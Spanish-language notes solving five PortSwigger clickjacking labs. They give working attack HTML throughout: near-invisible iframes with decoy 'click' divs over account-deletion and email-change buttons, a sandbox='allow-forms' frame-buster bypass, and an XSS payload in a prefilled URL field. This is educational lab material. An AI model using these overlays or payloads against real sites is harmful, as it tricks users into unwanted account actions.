---------------

El clickjacking es  una técnica maliciosa para engañar a usuarios de internet con el fin de que revelen información confidencial o tomar control de su ordenador cuando hacen clic en páginas web aparentemente inocentes.
## PortSwigger

###  Basic clickjacking with CSRF token protection

El objetivo es lograr que la victima elimine su cuenta al hacer click en nuestra web.

En este punto vamos a tener que engañar al usuario para que realize ciertas acciones maliciosas, vamos a jugar con `iframe` primero para cargar la pagina en la que tenemos el botón de eliminar:
```html
<iframe src="https://0a0b00230425c77880df0385008400ec.web-security-academy.net/my-account" width="100%" height="100%"></iframe>
```

![[Pasted image 20250912090309.png]]

![[Pasted image 20250912090337.png]]

El propósito en este punto es que tenemos que poner o insertar otro texto dentro del botón, para esto es ir jugando con html para lograr eso, el resultado en este caso es el siguiente:
```html
<style>
iframe{
width: 500px;
height: 600px;
opacity: 0.1;
}
div{
position: relative;
top:510px;
left:45px;
}
</style>

<div>click</div>
<iframe src="https://0a0b00230425c77880df0385008400ec.web-security-academy.net/my-account"></iframe>
```

esto es valido y aunque no me funciona el Lab se debería completar.


### Lab: Clickjacking with form input data prefilled from a URL parameter

Como el objetivo es cambiar el email vamos a capturar la petición que nos permite hacer eso:

![[Pasted image 20250912115350.png]]

Podemos observar como esta construida la petición, vamos a intentar ver que seguridad nomas se cumple con el `csrf` como eliminarlo o cambiar el método, además de eliminar caracteres y mas.

La verdad no encontramos nada fuera de lo común por lo que vamos a intentar ver si podemos insertar información desde la url en la parte de correo, usual mente para esto en la url se emplea un parámetro y pude ser el id, class o name que contiene el campo:
![[Pasted image 20250912115908.png]]
Vemos que se llama email, vamos a intentar ver si nos deja hacer esto en la URL:
![[Pasted image 20250912120359.png]]

Perfecto podemos observar que si mediante el parámetro `email` podemos dar valor al campo,  sin enviar aun la solicitud.

Con esto claro podemos crear nuestra web maliciosa:
```html
<style>
  iframe {
    width: 500px;
    height: 600px;
  }
</style>

<iframe
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

![[Pasted image 20250912120829.png]]
Vemos que sucede:
![[Pasted image 20250912120916.png]]
Perfecto, ya tenemos el campo relleno, en este punto lo que se puede hacer el mismo proceso que en el lab anterior quedando de la misma manera:
```html
<style>
  iframe {
    width: 500px;
    height: 600px;
    opacity: 0.001;
  }

  div {
    position: relative;
    top: 460px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

![[Pasted image 20250912122350.png]]

Con esto se completa la maquina, Lab Terminado:


### Lab: Clickjacking with a frame buster script

Este laboratorio vamos a tener el mismo objetivo que en los anteriores, con un pequeño problema y es que vamos a tener una seguridad aplicada donde la web mediante un script impide que la web cargue dentro de un sandbox y para burlara vamos a hacer uso de restricciones con sandbox, el concepto es sencillo al definirlo dentro del `iframe` este va a restringir todo lo que cargue pero conociendo que la información es un formulario lo que se hace es pasarle el valor de `allow-forms` con esto en mente y tomando en cuenta que es un clickjacking el código de nuestra web maliciosa queda de la siguiente manera:
```html
<style>
  iframe {
    width: 500px;
    height: 600px;
    opacity: 0.001;
  }

  div {
    position: relative;
    top: 460px;
    left: 50px;
  }
</style>

<div>click</div>
<iframe sandbox="allow-forms"
  src="https://0a5100d3043d67e780dc8fe6000200bf.web-security-academy.net/my-account?email=hacked@hacked.com"></iframe>
```

![[Pasted image 20250912131446.png]]

Con esto el Lab esta Terminado.

### Exploiting clickjacking vulnerability to trigger DOM-based XSS

Bueno en este lab lo primero es encontrar el XSS y mediante una pequeña búsqueda se determino que esta en el feedback, exactamente en el apartado de name:
![[Pasted image 20250912133236.png]]

![[Pasted image 20250912133423.png]]

bueno el objetivo es ir cargando información en cada cambo y mediante el clickjacking vamos a hacer que el usuario mande la petición maliciosa, primero vamos a ver si podemos rellenar los campos desde la url como vimos que se pudo en la maquina anterior:
```url
https://0a0c00e703ec8b3580cb1293008000ee.web-security-academy.net/feedback?name=Name&email=test@test.com&subject=hola&message=hola
```

![[Pasted image 20250912133759.png]]

Perfecto logramos cambiar mediante la url los campos, por ultimo vamos a crear nuestra web maliciosa para efectuar el clickjacking, además de en el apartado de name inyectar el `print()` que se pide para completar el lab:
```html
  <style>
    iframe {
      width: 500px;
      height: 900px;
      opacity: 0.0001;
    }

    div {
      position: relative;
      top: 810px;
      left: 50px;
    }
  </style>

  <div>click</div>
  <iframe
    src="https://0a0c00e703ec8b3580cb1293008000ee.web-security-academy.net/feedback?name=<img+src=0+onerror='print()'>&email=test@test.com&subject=hola&message=hola"></iframe>
```

![[Pasted image 20250912134611.png]]

Lo enviamos y debería resolverse. Lab terminado.


### Lab: Multistep clickjacking

Para este laboratorio tenemos que crear una cadena de ataque, donde el usuario va a borrar su cuenta y luego confirma la operación de borrar la cuenta y bueno el laboratorio es similar a los anteriores.
```html
<style>
iframe{
width:500px;
height: 600px;
opacity: 0.000001;
}
.firstClick{
position: absolute;
top:497px;
left:60px;
}
.nextClick{
position: absolute;
top:290px;
left:200px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="nextClick">Click me next</div>
<iframe src="https://0a8c008c0417d47785676eb5005c00ca.web-security-academy.net/my-account"></iframe>
```

![[Pasted image 20250912165605.png]]

![[Pasted image 20250912165613.png]]
Lab Terminado.